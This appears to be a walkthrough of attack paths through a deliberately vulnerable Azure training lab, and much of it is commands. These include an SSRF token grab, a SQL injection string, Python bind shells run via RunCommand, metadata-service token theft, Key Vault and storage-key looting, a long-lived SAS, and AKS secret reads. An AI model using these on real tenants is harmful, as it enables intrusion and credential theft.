## Attacks

This section is not complete and by no means exhaustive. The idea is to give some hints on what is possible in the lab.

## Architecture

![Img](../images/AzureLabFull.png)

The same diagram as a PDF can be found in `/attacks/AzureLabFull.pdf`.

### Tycho-terminal web service

This one is very vulnerable and has at least 3 paths you can take to get further in the lab.

#### SSRF
Microsoft implemented some additional security for App Services, exploiting a SSRF to obtain an identity token is not as easy as in a VM where you can simply access http://169.254.169.254/metadata. 

Take a look here:
https://learn.microsoft.com/en-us/azure/app-service/overview-managed-identity?tabs=portal%2Chttp

Curl solution:
```
curl -s -v -X POST \
   -H "Content-Type: application/json" \
  "http://[tycho_fqdn]/api/proxy" \
  --data '{"url": "http://[your_msi_endpoint]/msi/token?resource=https://vault.azure.net&api-version=2019-08-01", "headers":"X-IDENTITY-HEADER: [your_msi_secret]"}'
```

#### SQL Injection

The folks working for the OPA on the Tycho terminal clearly prioritize function over security. There are many ways to exploit this. One solution:
```
' union select id,subject_name,secret,principal_type, id from dbo.espionage_credentials;--
```

#### Storage Container Info Leak

In the leaked environment variables the URL of the deployed source code can be found. That one leaks the name of the storage account labpallas which also holds some other juicy information, like Alex's credentials. 

### SSH to Rocinante via Azure AD
(This only works if you activated MFA for the user aburton)
First, login as `aburton@yourdomain` via `az login`.
Then: 
```
az ssh vm -n Rocinante -g [lab_uniq_id]_ExpanseAzureSecLab
```

### SSH to Rocinante/Scopuli via Key
`ssh [Rocinante/Scopuli_admin_user]@[Rocinante/Scopuli_public_IP] -i [Rocinante/Scopuli_private_key]`

### Use Alex SP for RCE on Rocinante

Starting with the SP: Alex

First, login to `az cli` with Alex SP.
```bash
az login --service-principal -u "[alex_app_id]" -p "[alex_sp_password]" -t [your_tenant_id]
```

#### Optional: Check permissions for the SP.
Note: Alex SP himself cannot list his permissions.
```bash
az role assignment list --assignee "[alex_app_id]" --all --include-inherited --include-groups --output json --query '[].{principalName:principalName, roleDefinitionName:roleDefinitionName, scope:scope}'
```
This returns a role name. Check the role permissions:
```bash
az role definition list --name "VM_Rocinante_RunCommand_ExtensionsWrite_lab_uniq_id"
```
#### Create a bind shell on Rocinante using Azure CLI:

```bash
az vm run-command invoke --resource-group [rg_name] -n Rocinante --command-id RunShellScript --scripts "python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",51337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'"
```

### Use Managed Identity on VM

An example attack is to use the user-assigned managed identity bound to the `Rocinante` VM to execute code on the `Scopuli` VM:

1. SSH to the `Rocinante`: `ssh [Rocinante_admin_user]@[Rocinante_public_IP] -i [Rocinante_private_key]`
2. Install `azure-cli` on the VM (`sudo apt update && sudo apt install azure-cli`)
3. Log in with the user MI on the `Rocinante` VM: `az login --identity --user [KeysToTheScopuli_MI_principal_id]`
4. Confirm RCE is possible: `az vm run-command invoke --resource-group [lab_uniq_id]_ExpanseAzureSecLab -n Scopuli --command-id RunShellScript --scripts "touch /runcommandTest.txt"`

### Get Managed Identity token on VM

Get access token of the attached MI:
```bash
ARM_TOKEN=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com" | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
```

### Execute bind shell on VM (Scopuli) using API
This needs the "Get Managed Identity token on VM" technique to obtain a JWT token first.

Execute code on Scopuli using the access token via curl:

Fill in the variable:
```
SCO_ID="/subscriptions/[your_sub_id]/resourceGroups/[your_rg]/providers/Microsoft.Compute/virtualMachines/Scopuli"
```

```bash
curl -s -X POST -H "Authorization: Bearer $ARM_TOKEN" \
     -H "Content-Type: application/json" \
     "https://management.azure.com${SCO_ID}/runCommand?api-version=2024-11-01" \
     --data-binary @- <<'EOF'
{
  "commandId": "RunShellScript",
  "script": [
    "python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",51337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'"
  ]
}
EOF
```

### Accessing tycho-db from the Scopuli VM

Scopuli has owner permissions for the tycho-db - (might be worth finding out why ;) ). This can be used to access the DB:
```
sqlcmd -S tcp:[tycho_fqdn] -d tycho-db --authentication-method ActiveDirectoryDefault
```

### Pivot from Scopuli to Donnager

The MI attached to `Scopuli` (`scopuli-sql-provisioner`) holds a custom role granting `RunCommand` / `Extensions/Write` on the `Donnager` Windows VM. From a foothold on `Scopuli`, grab the MI token (see "Get Managed Identity token on VM") and execute code on `Donnager`:

```
DON_ID="/subscriptions/[your_sub_id]/resourceGroups/[your_rg]/providers/Microsoft.Compute/virtualMachines/Donnager"
```

```bash
curl -s -X POST -H "Authorization: Bearer $ARM_TOKEN" \
     -H "Content-Type: application/json" \
     "https://management.azure.com${DON_ID}/runCommand?api-version=2024-11-01" \
     --data-binary @- <<'EOF'
{
  "commandId": "RunPowerShellScript",
  "script": ["whoami; Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Expanse'"]
}
EOF
```

The `Donnager` admin (from the verbose output) is also reachable directly via RDP on the whitelisted `client_ip`.

### Donnager MI to Key Vault

The MI attached to `Donnager` (`JovianAccess`) is `Key Vault Secrets User` on the `Ganymede` Key Vault, which holds the `Protomolecule` SP credentials — and that SP is `Contributor` on the whole resource group.

On `Donnager` (via RDP or RunCommand), get a Key Vault token for the MI and read the secrets:
```powershell
$kv = (Invoke-RestMethod -Headers @{Metadata="true"} -Uri "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://vault.azure.net&api-version=2018-02-01").access_token
$vault = (Get-ItemProperty 'HKLM:\SOFTWARE\Expanse').KeyVaultName
Invoke-RestMethod -Headers @{Authorization="Bearer $kv"} -Uri "https://$vault.vault.azure.net/secrets/Protomolecule-App-ID?api-version=7.4"
Invoke-RestMethod -Headers @{Authorization="Bearer $kv"} -Uri "https://$vault.vault.azure.net/secrets/Protomolecule-App-Secret?api-version=7.4"
```

### Loot on the Donnager host

After RDP/RCE on `Donnager`:
- Cleartext credentials in the registry (`Get-ItemProperty 'HKLM:\SOFTWARE\Expanse'`, also stored as the `cmdkey` generic credential.
- MI `JovianAccess` also holds `Storage Account Contributor` on `labpallas`. This is a control-plane role and does not grant data access by itself, but it allows calling `listKeys` - and an account key bypasses every scoped data-plane role, giving full read/write to all containers and file shares.

Run a command on the Donnager and pull an account key, then use it as any storage owner would:
```bash
# Get MI JWT token
az vm run-command invoke \
  --resource-group ExpanseAzureSecLab \
  --name Donnager \
  --command-id RunPowerShellScript \
  --scripts '
$kvToken = (Invoke-RestMethod -Headers @{Metadata="true"} -Uri "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com&api-version=2018-02-01").access_token
$vault = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Expanse").KeyVaultName

Write-Output "Vault: $vault"
Write-Output "Token : $kvToken"
'

# Set vars
ARM_TOKEN="[$kvTokenOutput]"
SUB="[your_sub_id]"
RG="[your_rg]"
SA="labpallas[suffix]"
BLOB="labpallas-[suffix]"

# Get Storage Account Keys
curl -sS -X POST \
  -H "Authorization: Bearer $ARM_TOKEN" \
  -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers/Microsoft.Storage/storageAccounts/${SA}/listKeys?api-version=2026-04-01" \
  --data '{}'

KEY="[your account key]"

# List and download everything in the container (Alex's credentials.json, the Tycho source package)
az storage blob list     --account-name $SA --account-key "$KEY" -c $BLOB -o table
az storage blob download --account-name $SA --account-key "$KEY" -c pallas-[suffix] -n credentials.json -f ./credentials.json

# Reach the file share that mirrors the same secrets
az storage file list     --account-name $SA --account-key "$KEY" -s medina -o table

# Get access to the storage table on that account
az storage table list --account-name $SA --account-key "$KEY" -o table
# Extract the data
az storage entity query --account-name $SA --account-key "$KEY" --table-name deploycreds
```
The key also lets you mint a full-permission account SAS for offline reuse, independent of the MI:
```bash
az storage account generate-sas --account-name labpallas[suffix] --account-key "$KEY" \
  --services bfqt --resource-types sco --permissions rwdlacup --expiry 2099-01-01 -o tsv
```

### Use Storage Table SP for App Service RCE

The SP that can be found in the table of the storage account (readable using the storage key) has Contributor on the tycho-webapp. We can use this to execute code on it. Example assumes you are logged into az cli as the SP:

```bash

APP="<app_name>"

TOKEN=$(az account get-access-token \
  --resource https://management.azure.com/ \
  --query accessToken -o tsv)

curl -i -sS -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "https://${APP}.scm.azurewebsites.net/api/command" \
  --data '{"command":"id","dir":"/home/site/wwwroot"}'
  ```


### AKS Secrets Access

First, log in as the Chrisjen SP
```
az login --service-principal -u "[chrisjen_client_id]" --password '[chrisjen_client_secret]' -t tenant_id
```

Get cluster credentials
```
az aks get-credentials \
  --resource-group [lab_uniq_id]-ExpanseAzureSecLab \
  --name un_fleet_[lab_uniq_id] \
  --query "apiServerAccessProfile.enablePrivateCluster" --overwrite-existing
```

Convert to kubeconfig from Azure auth
```
kubelogin convert-kubeconfig \
  -l azurecli
```
Read secrets:
```
kubectl get secrets -o json
```
